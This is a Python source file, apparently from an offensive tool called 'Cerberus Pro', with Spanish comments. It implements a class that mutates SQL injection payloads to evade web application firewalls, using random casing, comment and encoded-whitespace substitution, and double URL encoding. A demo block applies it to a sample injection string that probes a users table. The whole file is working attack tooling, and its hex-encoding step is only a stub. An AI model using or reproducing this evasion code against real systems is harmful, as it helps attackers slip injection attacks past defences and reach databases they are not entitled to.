import urllib.parse
import random
import re
from typing import Dict, Any

class PayloadEvader:
    """
    Cerberus Pro v5.5 - Dynamic Payload Evader
    Muta los payloads al vuelo para evadir Web Application Firewalls (WAFs) modernos
    basados en firmas clásicas y ML primitivo.
    """
    
    def __init__(self, aggressiveness: int = 1):
        """
        :param aggressiveness:
            1: Ligera (solo URLEncode)
            2: Media (Case manipulation, URLEncode saltado)
            3: Extrema (Doble URL, comentarios inyectados, hex)
        """
        self.aggressiveness = aggressiveness
        
    def _random_case(self, text: str) -> str:
        """Convierte caracteres aleatorios a mayúsculas o minúsculas respetando comillas."""
        # Evitamos alterar dentro de comillas simples para no romper literales
        parts = text.split("'")
        for i in range(0, len(parts), 2):
            parts[i] = ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in parts[i])
        return "'".join(parts)
        
    def _inject_comments(self, text: str) -> str:
        """Reemplaza espacios con comentarios en línea o caracteres blancos ofuscados."""
        comments = ["/**/", "/* cerb */", "%0b", "%0c", "%09"]
        
        # Evitar alterar espacios dentro de comillas
        parts = text.split("'")
        for i in range(0, len(parts), 2):
            parts[i] = parts[i].replace(" ", random.choice(comments))
        return "'".join(parts)

    def _hex_encode_strings(self, text: str) -> str:
        """Si encuentra cadenas en comillas simples, las pasa a CHAR() o HEX."""
        # TODO: Se puede implementar una extracción de constantes numéricas a expresiones (ej 1 -> 2-1)
        return text

    def evade(self, payload: str, context: Dict[str, Any] = None) -> str:
        """
        Aplica las mutaciones basadas en el nivel de agresividad.
        """
        if not payload:
            return payload
            
        evaded = payload
        
        if self.aggressiveness >= 2:
            evaded = self._random_case(evaded)
            evaded = self._hex_encode_strings(evaded)
            
        if self.aggressiveness >= 3:
            evaded = self._inject_comments(evaded)
            
        # Encoding HTTP universal
        # Agresividad 1: Simple
        # Agresividad 3: Doble encoding (un WAF desencripta 1 vez, el backend 2)
        if self.aggressiveness == 3:
            evaded = urllib.parse.quote(urllib.parse.quote(evaded))
        else:
            evaded = urllib.parse.quote(evaded)
            
        return evaded

if __name__ == "__main__":
    # Test rápido de evasiones
    raw_payload = "1' OR (SELECT COUNT(*) FROM users) > 0"
    print(f"RAW: {raw_payload}")
    
    evader_lv1 = PayloadEvader(1)
    print(f"LVL1 (URL Encode): {evader_lv1.evade(raw_payload)}")
    
    evader_lv2 = PayloadEvader(2)
    evaded_lv2 = evader_lv2.evade(raw_payload)
    print(f"LVL2 (Random Case + URL): {evaded_lv2}")
    
    evader_lv3 = PayloadEvader(3)
    evaded_lv3 = evader_lv3.evade(raw_payload)
    print(f"LVL3 (Extreme Obfuscation): {evaded_lv3}")
